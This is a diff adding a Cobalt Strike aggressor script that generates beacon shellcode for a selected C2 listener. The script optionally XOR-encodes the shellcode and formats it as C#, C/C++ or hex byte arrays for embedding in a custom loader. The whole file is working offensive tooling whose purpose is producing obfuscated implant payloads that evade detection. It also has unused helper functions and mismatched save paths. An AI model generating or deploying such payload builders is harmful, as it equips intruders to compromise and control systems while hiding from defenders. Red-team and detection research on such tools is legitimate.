@@ -1,0 +1,187 @@
+##XOR'd raw payload
+##Author: @ZN
+##Generates A raw payload then and encodes it in your format of choice, can do advanced military encryption aswell.
+
+popup shellcode_popup {
+    $dialog = dialog("Military Grade Encryptor", %(listener => "Select Listener", xor_key => random_string("4"), line_length => "80"), &shellcode_gen);
+	dialog_description($dialog, "Generate a stageless byte array to use in a custom loader, by default a x64 payload will be created");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 Shellcode");
+	drow_combobox($dialog, "format", "Formatting: ", @("raw","hex","c#","c/c++"));
+	drow_checkbox($dialog, "XOR", "XOR: ", "XOR Encrypt Shellcode");
+	drow_text($dialog, "xor_key", "XOR Key\(s\): ");
+	drow_combobox($dialog, "multiline", "Multiline Output: ", @("none","quoted","chunks.push_back"));
+	drow_text($dialog, "line_length", "Multiline Length: ");
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+menubar("Military Grade Encryptor", "shellcode_popup");
+
+sub shellcode_gen {
+	# Uncomment to enable cna script debugging
+	# debug(debug() | 64);
+
+    $arch = "x64";
+
+	if ($3['x86'] eq "true") {
+		$arch = "x86";
+	}
+
+    $shellcode = artifact_payload($3['listener'], "raw", $arch);
+
+	# Assign menu selections to variables used in shellcode build
+	$xorkey = $3['xor_key'];
+	$linelength = $3['line_length'];
+
+	# Error if no Listener or file is selected
+	#if (($3['listener'] ismatch "Select Listener") && ($3['scfile'] ismatch "")) {
+		#berror($1, 'You did not select a proper Listener.');
+		#show_message("Please select a Listener or Shellcode file.");
+		#break;
+	#}
+
+	# Get raw shellcode size in bytes
+	$sc_size = strlen($shellcode);
+
+    # No Encryption
+	if ($3['XOR'] eq "false") {
+		$encrypted_shellcode = $shellcode
+	}
+		
+		# XOR Encryption
+	if ($3['XOR'] eq "true") {
+		$encrypted_shellcode = str_xor($shellcode, $xorkey);
+        println("Encrypted length: " . strlen($encrypted_shellcode));
+		# Save XOR key to a file
+		$xorkey_resource = openf(">".script_resource($XORKEY)."");
+		writeb($xorkey_resource, $xorkey);
+		closef($xorkey_resource);
+		# Show XOR key in popup message and script console
+		println("XOR Key: " . $xorkey . "");
+		show_message("XOR key used is: $xorkey");
+	}
+
+	###### Formatting Section
+	# hex format
+	if ($3['format'] eq "hex") {
+		$format_shellcode = transform($encrypted_shellcode, "hex");
+	}
+	
+	# c# format
+	if ($3['format'] eq "c#") {
+		$format_shellcode = format_csharp($encrypted_shellcode);
+	}
+
+	# c/cpp format
+	if ($3['format'] eq "c/c++") {
+		$format_shellcode = format_cpp($encrypted_shellcode);
+	}
+		
+	###### Multiline Output Section
+	if ($3['multiline'] eq "none") {
+	    $final_shellcode = $format_shellcode;
+	}
+
+	if ($3['multiline'] eq "quoted") {
+	    $final_shellcode = format_multiline($format_shellcode);
+	}
+
+	if ($3['multiline'] eq "chunks.push_back") {
+		$final_shellcode = format_chunks($format_shellcode);
+	}
+
+	###### Shellcode writing section
+	# Get final shellcode size and write to a file
+	$final_size = strlen($final_shellcode);
+	$finalsize_resource = openf(">".script_resource($FINALSIZE)."");
+	writeb($finalsize_resource, $final_size);
+	closef($finalsize_resource);
+
+	# Write raw shellcode size to a file
+	$rawsize_resource = openf(">".script_resource($RAWSIZE)."");
+	writeb($rawsize_resource, $sc_size);
+	closef($rawsize_resource);
+
+	# Write shellcode to a file
+	$resource = openf(">".script_resource($SCFILE)."");
+	writeb($resource, $final_shellcode);
+	closef($resource);
+
+	# Promt to save shellcode to a user location and filename
+	$name = prompt_file_save("beacon", {
+		local('$outfile');
+		$outfile = openf("> $+ $1");
+		writeb($outfile, $final_shellcode);
+		closef($outfile);
+		# Show raw and final shellcode size in popup message and script console
+		println("RAW Shellcode size: " . $sc_size . "");
+		println("Final Shellcode size: " . $final_size . "");
+		show_message("Raw shellcode size is: $sc_size bytes, Final shellcode size is: $final_size bytes");
+	});
+}
+
+###### Helper Functions Section
+# generate random string for variable substitution and keygens
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+# Format shellcode into C# type 0x90,0x90,0x90
+sub format_csharp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(",0x", @fmt);
+}
+
+# Format shellcode into C/C++ type \x90\x90\x90
+sub format_cpp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "\\x". join("\\x", @fmt);
+}
+
+# Format shellcode into quoted multi-line output
+sub format_multiline {
+	$key = $1;
+	@fmt = str_chunk($key, $linelength);
+	return "\"". join("\"\n\"", @fmt) ."\"";
+}
+
+# Format shellcode into chunks.push_back(""); multi-line output
+sub format_chunks {
+	$key = $1;
+	@fmt = str_chunk($key, $linelength);
+	return "chunks.push_back(\"". join("\"\)\;\nchunks.push_back(\"", @fmt) ."\"\)\;";
+}
+
+# Section to create RAW payload
+sub Stageless_Output {
+	
+	if ($3['Name'] ismatch "") {
+		berror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');
+		show_message("Please select a proper SMB Listener and Input a Payload Name!");
+	}
+	#Stageless Payloads
+	else if ($3['Output'] eq 'raw') {
+		artifact_stageless($3['listener'], "raw", "x64", "", &raw);
+		$Name = "".$3['Name']."";
+	}
+}
+
+#Sub Functions for Stageless Artifacts
+sub raw {
+	#Write and Save Payload
+	local('$cradle4');
+	$cradle4 = openf("~/Desktop/Purple/cobaltstrike/payloads". $Name .".bin");
+	writeb($cradle4, $1);
+	closef($cradle4);
+	show_message("Saved Raw SMB Payload at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".bin");
+}
